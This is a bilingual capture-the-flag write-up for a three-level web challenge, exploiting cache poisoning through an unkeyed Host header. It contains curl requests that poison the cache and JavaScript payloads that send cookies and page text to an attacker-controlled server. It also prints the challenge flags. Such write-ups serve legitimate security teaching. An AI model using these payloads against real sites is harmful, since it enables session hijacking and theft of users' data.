# Nom du défi

## Write-up FR

### Niveau 1
Dans un premier temps, il faut se rendre compte que la page principale utilise l'entête HOST pour générer le lien du script `index.js`. Il est donc possible de modifier l'entête HOST pour modifier le contenu de la page générée.
```shell
❯ curl -X GET -H "Host: anything" http://host:port/?name=JakeRansom
[...]
        <div class="link">
            <a href="journal">Voir le journal du Dr. Proxy Jones</a>
        </div>

        <script src="http://anything/static/index.js"></script>
[...]
```

On remarque également la présence de l'entête X-Cache-Status: HIT ou MISS dans les réponses du serveur, indiquant la présence d'un système de cache.
```shell
❯ curl -X GET -I http://localhost:8000/\?name\=anothername
HTTP/1.1 200 OK
[...]
X-Cache-Status: MISS
```

En changeant l'entête HOST dans une requête, on voit que cet entête n'est pas utilisé dans la clé de cache. En effet, en refaisant la première requête sans modifier l'entête HOST, on obtient un HIT.
```shell
❯ curl -X GET -I http://localhost:8000/\?name\=JakeRansom
HTTP/1.1 200 OK
[...]
X-Cache-Status: HIT
```
On peut donc mettre en cache une page avec un HOST différent, et la page sera servie à tous les utilisateurs.

En mettant en cache une page avec un HOST pointant vers un serveur que l'on contrôle, lorsque le Dr. Proxy Jones visitera la page, son navigateur tentera de charger le script depuis notre serveur, et on pourra récupérer le flag dans son User-Agent. La description nous indique que le Dr. Proxy utilise le nom DrProxy ou Proxy, nous savons donc quel paramètre **name** (qui agit comme un cache buster) utiliser pour le cibler.


```shell
❯ curl -H "Host: monserveur.com" http://host:port/?name=DrProxy
[...]
        <div class="link">
            <a href="journal">Voir le journal du Dr. Proxy Jones</a>
        </div>

        <script src="http://monserveur.com/static/index.js"></script>
[...]
```

### Niveau 2
Ici, le but est de voler la session du Dr. Proxy Jones.

Il faut donc héberger sur notre serveur un script `index.js` qui exfiltre les cookies de la page.

Un script très simple peut être utilisé pour cela :
```javascript
fetch('https://monserveur.com/?cookies=' + document.cookie);
```

Pour éviter les problèmes de CORS, il faut bien penser à ajouter l'entête `Access-Control-Allow-Origin: *` dans la réponse de notre serveur.

## Niveau 3

Ici, il faut réussir à voler le contenu de la page journal du Dr. Proxy Jones, qui est protégée par un mot de passe à usage unique.

Pour cela, on peut utiliser la faille de cache poisoning sur deux pages différentes :

- La première redirige le Dr. Proxy Jones vers la page journal qui est dans son historique après avoir ouvert un onglet vers la seconde page. On peut héberger sur notre serveur le script `index.js` suivant :
```javascript
open("/?name=Proxy");
window.history.go(-1);
```

- La seconde page permet de récupérer le contenu de la première page (qui contient maintenant le flag) grâce à la propriété [opener](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener). Le script `index.js` hébergé sur notre serveur pour cela :
```javascript
fetch("https://monserveur.com?"+opener.document.body.innerText);
```
> Note : Il est possible de récupérer le contenu de la page mère seulement car les deux pages sont du même domaine.

## Write-up EN

### Level 1
First, we need to realize that the main page uses the HOST header to generate the link to the `index.js` script. It is therefore possible to modify the HOST header to change the content of the generated page.
```shell
❯ curl -X GET -H "Host: anything" http://host:port/?name=JakeRansom
[...]
        <div class="link">
            <a href="journal">Voir le journal du Dr. Proxy Jones</a>
        </div>

        <script src="http://anything/static/index.js"></script>
[...]
```

We also notice the presence of the X-Cache-Status: HIT or MISS header in the server's responses, indicating the presence of a cache system.
```shell
❯ curl -X GET -I http://localhost:8000/\?name\=anothername
HTTP/1.1 200 OK
[...]
X-Cache-Status: MISS
```

By changing the HOST header in a request, we see that this header is not used in the cache key. Indeed, by redoing the first request without modifying the HOST header, we get a HIT.

```shell
❯ curl -X GET -I http://localhost:8000/\?name\=JakeRansom
HTTP/1.1 200 OK
[...]
X-Cache-Status: HIT
```

We can therefore cache a page with a different HOST, and the page will be served to all users.

By caching a page with a HOST pointing to a server we control, when Dr. Proxy Jones visits the page, his browser will try to load the script from our server, and we will be able to retrieve the flag in his User-Agent. The description tells us that Dr. Proxy uses the name DrProxy or Proxy, so we know which **name** parameter (which acts as a cache buster) to use to target him.

```shell
❯ curl -X GET -H "Host: myserver.com" http://host:port/?name=DrProxy
[...]
        <div class="link">
            <a href="journal">Voir le journal du Dr. Proxy Jones</a>
        </div>

        <script src="http://myserver.com/static/index.js"></script>
[...]
```


### Level 2
Here, the goal is to steal Dr. Proxy Jones' session.

We need to host on our server a `index.js` script that exfiltrates the page's cookies.

A very simple script can be used for this:
```javascript
fetch('https://myserver.com/?cookies=' + document.cookie);
```

To avoid CORS problems, we must remember to add the `Access-Control-Allow-Origin: *` header to our server.

### Level 3

Here, we need to steal the content of Dr. Proxy Jones' journal page, which is protected by a one-time password.

To do this, we can use the cache poisoning flaw on two different pages:

- The first one redirects Dr. Proxy Jones to the journal page that is in his history after opening a tab to the second page. We can host on our server the `index.js` script:
```javascript
open("/?name=Proxy");
window.history.go(-1);
```

- The second page allows retrieving the content of the first page (which now contains the flag) thanks to the [opener](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) property. The `index.js` script hosted on our server for this purpose:
```javascript
fetch("https://myserver.com?"+opener.document.body.innerText);
```
> Note: It is only possible to retrieve the content of the parent page because the two pages are of the same domain.

## Flag

Level 1 : `polycyber{Jones_1s_us1ng_a_we1rd_br0wser}`

Level 2 : `polycyber{Session_c0ok1es_sh0uld_be_http0nly}`

Level 3 : `polycyber{Luck7_h3_ch3ck3d_h1s_n0t3s_b3f0r3}`